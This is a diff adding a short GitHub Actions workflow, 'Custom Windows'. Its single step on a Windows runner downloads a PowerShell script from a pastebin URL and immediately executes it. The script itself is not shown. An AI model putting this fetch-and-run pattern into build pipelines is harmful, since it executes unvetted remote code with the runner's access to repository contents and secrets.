@@ -1,0 +1,14 @@
+name: Custom Windows
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Downloading & Setting Up
+        run: Invoke-WebRequest https://pastebin.com/raw/cDSid5PL -OutFile "code.ps1" && ./code.ps1
+        
+        
